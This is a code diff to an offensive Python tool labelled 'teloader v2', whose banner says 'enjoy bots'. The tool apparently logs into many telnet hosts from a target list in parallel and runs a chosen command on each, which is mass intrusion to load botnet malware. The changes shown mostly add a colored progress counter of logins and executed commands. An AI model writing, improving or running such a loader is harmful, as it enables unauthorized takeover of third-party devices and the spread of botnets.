@@ -1,6 +1,7 @@
 import telnetlib
 import socket
 import argparse
+import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 
@@ -17,18 +18,67 @@ from threading import Lock
 # '    "*88888888*    "88888%    ^*888%     "   "8888888*     'Y"      "888*""888"  `"888*""    "88888%       "Y"      
 #         ^"***"`       "YP'       "%             ^"**""                ^Y"   ^Y'      ""         "YP'                 
                                                                                                                      
-#                                                                           teloader v1 by @Syn2Much
+#                                                                           teloader v2 by @Syn2Much
 #                                                                                 enjoy bots                                    
+# ANSI colors
+RST = "\033[0m"
+BOLD = "\033[1m"
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+CYAN = "\033[96m"
+WHITE = "\033[97m"
+
 # Lock for thread-safe printing
 print_lock = Lock()
+counter_visible = False  # tracks whether the counter bar is currently displayed
 
 TIMEOUT = 10  # Connection timeout in seconds
 
 
-def safe_print(*args, **kwargs):
-    """Thread-safe print function."""
+def build_counter(total, logins, commands, remaining):
+    """Build the colored counter bar string."""
+    return (
+        f"  {BOLD}{WHITE}[Total: {total}]{RST}  "
+        f"{BOLD}{GREEN}[Logins: {logins}]{RST}  "
+        f"{BOLD}{YELLOW}[Commands: {commands}]{RST}  "
+        f"{BOLD}{CYAN}[Remaining: {remaining}]{RST}"
+    )
+
+
+def display_result(text, total, logins, commands, remaining):
+    """Clear the counter line, print a result, then reprint the counter."""
+    global counter_visible
     with print_lock:
-        print(*args, **kwargs)
+        # If a counter bar is on screen, erase it first
+        if counter_visible:
+            sys.stdout.write("\r\033[2K")
+        # Print the result line(s)
+        print(text)
+        # Reprint the counter bar (no trailing newline so it stays in place)
+        sys.stdout.write(build_counter(total, logins, commands, remaining))
+        sys.stdout.flush()
+        counter_visible = True
+
+
+def update_counter(total, logins, commands, remaining):
+    """Redraw only the counter bar in-place (no result to print)."""
+    global counter_visible
+    with print_lock:
+        sys.stdout.write("\r\033[2K")
+        sys.stdout.write(build_counter(total, logins, commands, remaining))
+        sys.stdout.flush()
+        counter_visible = True
+
+
+def clear_counter():
+    """Clear the counter bar so normal output can resume."""
+    global counter_visible
+    with print_lock:
+        if counter_visible:
+            sys.stdout.write("\r\033[2K")
+            sys.stdout.flush()
+            counter_visible = False
 
 
 def parse_target(target_line):
@@ -182,31 +232,45 @@ Target file format (one per line):
     results = []
     successful = 0
     failed = 0
-    
+    total = len(targets)
+
+    # Show initial counter
+    update_counter(total, 0, 0, total)
+
     # Process targets with thread pool
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         # Submit all tasks
         future_to_target = {
-            executor.submit(telnet_connect, target, args.command): target 
+            executor.submit(telnet_connect, target, args.command): target
             for target in targets
         }
-        
+
         # Process results as they complete
         for future in as_completed(future_to_target):
             result = future.result()
             results.append(result)
-            
+
+            remaining = total - len(results)
+
             if result['success']:
                 successful += 1
-                safe_print(f"\n[+] SUCCESS: {result['host']}:{result['port']} ({result['user']})")
-                safe_print(f"    Output: {result['output'][:200]}")
+                text = (
+                    f"{GREEN}[+] SUCCESS: {result['host']}:{result['port']} "
+                    f"({result['user']}){RST}\n"
+                    f"    Output: {result['output'][:200]}"
+                )
+                display_result(text, total, successful, successful, remaining)
             else:
                 failed += 1
-                safe_print(f"\n[-] FAILED: {result['host']}:{result['port']} - {result['error']}")
-    
+                text = f"{RED}[-] FAILED: {result['host']}:{result['port']} - {result['error']}{RST}"
+                display_result(text, total, successful, successful, remaining)
+
+    # Clear the counter bar before printing summary
+    clear_counter()
+
     # Print summary
     print("\n" + "=" * 60)
-    print(f"[*] Completed: {successful} successful, {failed} failed")
+    print(f"[*] Completed: {GREEN}{successful} successful{RST}, {RED}{failed} failed{RST}")
     
     # Save results to file if specified
     if args.output:
